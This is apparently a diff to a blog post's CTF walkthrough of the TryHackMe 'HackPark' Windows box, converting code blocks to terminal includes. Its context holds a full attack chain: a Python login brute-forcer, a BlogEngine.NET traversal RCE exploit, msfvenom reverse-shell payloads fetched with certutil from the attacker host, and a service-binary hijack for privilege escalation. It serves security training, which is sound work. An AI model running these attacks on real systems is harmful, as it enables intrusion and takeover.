@@ -26,8 +26,7 @@ Let's take a trip to the HackPark.  We all float down here!
 
 First things first, run nmap to get a list of the services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.150.103
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 10:39 AEDT
@@ -58,14 +57,13 @@ PORT     STATE SERVICE       VERSION
 |_  System_Time: 2025-02-25T23:40:40+00:00
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Try to run the vulnerability category of nmap scripts to find low hanging fruit.
 
-{% raw %}
-```bash
+{% capture vulnchk %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ sudo nmap --script vuln -oN vulnchk -Pn 10.10.150.103
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 10:39 AEDT
@@ -129,8 +127,8 @@ PORT     STATE SERVICE
 |_      https://weakdh.org
 
 Nmap done: 1 IP address (1 host up) scanned in 754.51 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=vulnchk %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -163,8 +161,7 @@ Click on the hamburger button and select login to navigate to the login page.
 <br />
 Try the hydra command that was given in the box description.  It doesn't seem to work.  Why is it only half the command?  I am so confused.  Regardless, I also tried other variations.  Couldn't get it to work...or got impatient.  Gave up.
 
-{% raw %}
-```bash
+{% capture hydra %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.150.103 http-post-form    
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -172,8 +169,8 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-26 10:52:57
 [WARNING] You must supply the web page as an additional option or via -m, default path set to /
 [ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hydra %}
 
 <br />
 Try logging in on the form and view the request in the devtools.
@@ -187,8 +184,7 @@ Try logging in on the form and view the request in the devtools.
 <br />
 Whip up a script to brute-force the login.  You can base this script on the request we captured earlier.
 
-{% raw %}
-```python
+{% capture thmhackpark00 %}
 import requests
 from bs4 import BeautifulSoup
 
@@ -216,18 +212,17 @@ with open('/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt'
         if 'Forgot your password' not in r2.text:
             print('admin:{passwd}'.format(passwd=passwd))
             break
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='thm-hackpark_0x00.py' content=thmhackpark00 %}
 
 <br />
 Run the brute-forcer, we just wrote.  Jackpot!!
 
-{% raw %}
-```python
+{% capture runbruteforcer %}
 ======== RESTART: /home/kali/Documents/thm/hackpark/thm-hackpark_0x00.py =======
 admin:1qaz2wsx
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runbruteforcer %}
 
 <br />
 You could also use Intruder, if you can't be bothered to write your own.
@@ -268,8 +263,7 @@ Check the exploit-db looking for something juicy for our version of BlogEngine.N
 <br />
 Download the exploit and update the IP address and the port.  Make sure you name it PostView.ascx.
 
-{% raw %}
-```java
+{% capture PostViewascx %}
 # Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
 # Date: 02-11-2019
 # Exploit Author: Dustin Cobb
@@ -362,56 +356,56 @@ Download the exploit and update the IP address and the port.  Make sure you name
 
 </script>
 <asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='aspx' title='PostView.ascx' content=PostViewascx %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ sudo nc -nlvp 443                          
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Request the appropriate link indicated in the exploit.
 
-{% raw %}
-```bash
+{% capture curltrigger %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ curl 'https://10.10.150.103/?theme=../../App_Data/files'
-
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curltrigger %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchfootholdshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ sudo nc -nlvp 443                          
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.150.103] 49350
+{% endcapture %}
+
+{% capture windowsfootholdshell %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 whoami
 c:\windows\system32\inetsrv>whoami
 iis apppool\blog
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html language='bash' title='bash' content=catchfootholdshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsfootholdshell %}
 
 <br />
 Generate an msfvenom executable with a meterpreter payload.
 
-{% raw %}
-```bash
+{% capture generatemeterpayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=4444 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -424,15 +418,13 @@ Saved as: meter.exe
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=generatemeterpayload %}
 
 <br />
 Transfer to the victim machine.
 
-{% raw %}
-```bash
+{% capture transfermeter %}
 c:\windows\system32\inetsrv>cd C:\Windows\Temp
 pwd
 C:\Windows\Temp>pwd
@@ -440,14 +432,13 @@ certutil.exe -urlcache -f http://10.4.119.29:8000/meter.exe meter.exe
 C:\Windows\Temp>certutil.exe -urlcache -f http://10.4.119.29:8000/meter.exe meter.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transfermeter %}
 
 <br />
 Set a multi/handler listener in msfconsole.
 
-{% raw %}
-```bash
+{% capture msfconsolestart %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ msfconsole -q                                                                               
 msf6 > use exploit/multi/handler
@@ -462,38 +453,35 @@ msf6 exploit(multi/handler) > set lport 4444
 lport => 4444
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:4444
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfconsolestart %}
 
 <br />
 Execute the meterpreter payload.
 
-{% raw %}
-```bash
+{% capture executemeter %}
 .\meter.exe
 C:\Windows\Temp>.\meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=executemeter %}
 
 <br />
 Check the handler and catch the session.
 
-{% raw %}
-```bash
+{% capture catchmetersession %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:4444 
 [*] Sending stage (177734 bytes) to 10.10.150.103
 [*] Meterpreter session 1 opened (10.4.119.29:4444 -> 10.10.150.103:49368) at 2025-02-26 12:50:27 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmetersession %}
 
 <br />
 Run the systeminfo command to figure out what system that we are on.  Note, the Original Install Date.
 
-{% raw %}
-```bash
+{% capture systeminfo %}
 C:\Windows\Temp>systeminfo
 systeminfo
 
@@ -546,14 +534,13 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.150.103
                                  [02]: fe80::1503:f867:23c8:fae9
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=systeminfo %}
 
 <br />
 Run sysinfo in the meterpreter session.
 
-{% raw %}
-```bash
+{% capture sysinfo %}
 meterpreter > sysinfo
 Computer        : HACKPARK
 OS              : Windows Server 2012 R2 (6.3 Build 9600).
@@ -562,40 +549,36 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 1
 Meterpreter     : x86/windows
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sysinfo %}
 
 <br />
 Download PowerUp.ps1 to the attack machine.
 
-{% raw %}
-```bash
+{% capture downloadpowerup %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1 
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  586k  100  586k    0     0  1084k      0 --:--:-- --:--:-- --:--:-- 1086k
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpowerup %}
 
 <br />
 Load the PowerShell extension in the meterpreter session.
 
-{% raw %}
-```bash
+{% capture loadpowershell %}
 meterpreter > load powershell
 Loading extension powershell...Success.
 meterpreter > powershell_shell
-PS >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loadpowershell %}
 
 <br />
 Run all of the checks.
 
-{% raw %}
-```bash
-meterpreter > powershell_shell
+{% capture invokeallchecks %}
+PS >
 PS > . .\PowerUp.ps1
 PS > Invoke-AllChecks
 
@@ -646,14 +629,13 @@ Path           : C:\PROGRA~2\SYSTEM~1\WScheduler.exe /LOGON
 ModifiableFile : @{ModifiablePath=C:\PROGRA~2\SYSTEM~1\WScheduler.exe; IdentityReference=Everyone;
  Name           : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\WScheduler
 Check          : Modifiable Registry Autorun
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=invokeallchecks %}
 
 <br />
 Check the privs for our user.
 
-{% raw %}
-```bash
+{% capture whoamipriv %}
 PS > whoami /priv
 
 PRIVILEGES INFORMATION
@@ -668,14 +650,13 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=whoamipriv %}
 
 <br />
 Load incognito and list all of the tokens.
 
-{% raw %}
-```bash
+{% capture loadincognito %}
 meterpreter > load incognito
 Loading extension incognito...Success.
 meterpreter > list_tokens -g
@@ -694,14 +675,13 @@ NT AUTHORITY\This Organization
 Impersonation Tokens Available
 ========================================
 No tokens available
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loadincognito %}
 
 <br />
 Download winpeas.exe.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASx64.exe -O winpeas.exe                 
 --2025-02-26 14:03:08--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASx64.exe
@@ -719,27 +699,25 @@ Saving to: ‘winpeas.exe’
 winpeas.exe                                                100%[========================================================================================================================================>]   9.67M  3.13MB/s    in 3.1s    
 
 2025-02-26 14:03:13 (3.13 MB/s) - ‘winpeas.exe’ saved [10142720/10142720]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Upload it to the victim machine.
 
-{% raw %}
-```bash
+{% capture uploadpeas %}
 meterpreter > upload winpeas.exe
 [*] Uploading  : /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
 [*] Uploaded 8.00 MiB of 9.67 MiB (82.71%): /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
 [*] Uploaded 9.67 MiB of 9.67 MiB (100.0%): /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
 [*] Completed  : /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=uploadpeas %}
 
 <br />
 Run it.  Notice the error at the end.
 
-{% raw %}
-```bash
+{% capture exception %}
 
 <snip>
 
@@ -750,14 +728,13 @@ Unhandled Exception: System.MissingMethodException: Method not found: '!!0[] Sys
    at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)
    at winPEAS.Checks.Checks.Run(String[] args)
    at winPEAS.Program.Main(String[] args)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=exception %}
 
 <br />
 Download winpeas.bat.
 
-{% raw %}
-```bash
+{% capture downloadpeasbat %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/winPEAS.bat   
 --2025-03-23 20:55:33--  https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/winPEAS.bat
@@ -779,14 +756,13 @@ winPEAS.bat                                                100%[================
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeasbat %}
 
 <br />
 Transfer to the victim machine and run it.  Note, the Original Install Time...again.
 
-{% raw %}
-```bash
+{% capture runpeas %}
 C:\Windows\Temp>.\winPEAS.bat
 .\winPEAS.bat
 
@@ -808,14 +784,13 @@ Product ID:                00252-70000-00000-AA886
 Original Install Date:     8/3/2019, 10:43:23 AM
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=runpeas %}
 
 <br />
 Run schtasks /query to try and view the tasks.
 
-{% raw %}
-```bash
+{% capture schtasksquery %}
 C:\Windows\Temp>schtasks /query
 schtasks /query
 
@@ -825,14 +800,13 @@ TaskName                                 Next Run Time          Status
 INFO: There are no scheduled tasks presently available at your access level.
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=schtasksquery %}
 
 <br />
 Run schtasks /query /fo LIST /v to get all of the scheduled tasks with more detail.
 
-{% raw %}
-```bash
+{% capture schtaskslist %}
 C:\Windows\Temp>schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v
 
@@ -846,14 +820,13 @@ Folder: \Microsoft\Windows
 INFO: There are no scheduled tasks presently available at your access level.
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=schtaskslist %}
 
 <br />
 Get a list of service running and notice the WindowsScheduler service.  This is usually running some kind of service that we might be able to abuse.
 
-{% raw %}
-```bash
+{% capture getservices %}
 C:\Windows\Temp>powershell -c "Get-Service | Where-Object {$_.Status -eq \"Running\"}"
 powershell -c "Get-Service | Where-Object {$_.Status -eq \"Running\"}"
 
@@ -867,26 +840,24 @@ Running  WindowsScheduler   System Scheduler Service
 Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
 Running  Winmgmt            Windows Management Instrumentation    
 Running  WinRM              Windows Remote Management (WS-Manag...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=getservices %}
 
 <br />
 After heaps of research on where the logs where located (seriously...hours), change directory into the SystemScheduler\Events directory.
 
-{% raw %}
-```bash
+{% capture logs %}
 C:\Windows\Temp>cd "C:\Program Files (x86)\SystemScheduler\Events
 cd "C:\Program Files (x86)\SystemScheduler\Events
 
 C:\Program Files (x86)\SystemScheduler\Events>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=logs %}
 
 <br />
 Type the file and view the contents to get what the sceduler has been trying to run.
 
-{% raw %}
-```bash
+{% capture viewlog %}
 C:\Program Files (x86)\SystemScheduler\Events>type 20198415519.INI_LOG.txt
 type 20198415519.INI_LOG.txt
 08/04/19 15:06:01,Event Started Ok, (Administrator)
@@ -894,14 +865,13 @@ type 20198415519.INI_LOG.txt
 08/04/19 15:07:00,Event Started Ok, (Administrator)
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=viewlog %}
 
 <br />
 Icacls the message binary from the parent folder of the events folder that we are currently in.  This should give use the permissions of the file.
 
-{% raw %}
-```bash
+{% capture icalcmessage %}
 C:\Program Files (x86)\SystemScheduler>icacls Message.exe
 icacls Message.exe
 Message.exe Everyone:(I)(M)
@@ -911,14 +881,13 @@ Message.exe Everyone:(I)(M)
             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
 
 Successfully processed 1 files; Failed processing 0 files
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=icalcmessage %}
 
 <br />
 Generate another msfvenom meterpreter payload, with a different port than our first payload.  Call the new binary Message.exe.
 
-{% raw %}
-```bash
+{% capture gennewmessage %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=4445 -f exe -o Message.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -931,14 +900,13 @@ Saved as: Message.exe
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=gennewmessage %}
 
 <br />
 Set a handler.
 
-{% raw %}
-```bash
+{% capture setmessagehandler %}
 ┌──(kali㉿kali)-[~/Documents/thm/hackpark]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -953,50 +921,46 @@ msf6 exploit(multi/handler) > set lport 4445
 lport => 4445
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:4445
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=setmessagehandler %}
 
 <br />
 Transfer the binary to the victim machine.  Overwrite the existing Message.exe binary.
 
-{% raw %}
-```bash
+{% capture transfermessage %}
 C:\Program Files (x86)\SystemScheduler>certutil.exe -urlcache -f http://10.4.119.29:8000/Message.exe Message.exe
 certutil.exe -urlcache -f http://10.4.119.29:8000/Message.exe Message.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transfermessage %}
 
 <br />
 Check the handler and catch the session.
 
-{% raw %}
-```bash
+{% capture catchmassagesession %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:4445 
 [*] Sending stage (203846 bytes) to 10.10.32.1
 [*] Meterpreter session 1 opened (10.4.119.29:4445 -> 10.10.32.1:49235) at 2025-03-23 22:27:59 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmassagesession %}
 
 <br />
 Check the uid to ensure that we are Administrator.
 
-{% raw %}
-```bash
+{% capture getuid %}
 meterpreter > getuid
 Server username: HACKPARK\Administrator
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=getuid %}
 
 <br />
 Another way to elevate if you want to know, is local_exploit_suggester.  Background the session and give it a run.
 
-{% raw %}
-```bash
+{% capture suggester %}
 meterpreter > 
 Background session 1? [y/N]  
 msf6 exploit(multi/handler) > search suggester
@@ -1041,14 +1005,13 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
  8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 
  <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=suggester %}
 
 <br />
 Choose the reflection juicy exploit from the list.  Execute it.
 
-{% raw %}
-```bash
+{% capture reflectjuicy %}
 msf6 exploit(windows/local/ms16_075_reflection) > use exploit/windows/local/ms16_075_reflection_juicy 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
@@ -1071,25 +1034,23 @@ msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit
 [*] Meterpreter session 2 opened (10.4.119.29:4444 -> 10.10.60.15:49307) at 2025-02-26 15:57:20 +1100
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=reflectjuicy %}
 
 <br />
 Migrate to a process that is owned by SYSTEM.
 
-{% raw %}
-```bash
+{% capture migrate1156 %}
 meterpreter > migrate 1156
 [*] Migrating from 3216 to 1156...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=migrate1156 %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 C:\Users\jeff\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -1111,14 +1072,13 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Users\jeff\Desktop>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 <redacted>
@@ -1140,8 +1100,8 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 Looks like we were able to smackdown the Dancing Clown in the HackPark.  Hopefully, you enjoyed the read.  See you in the next one.
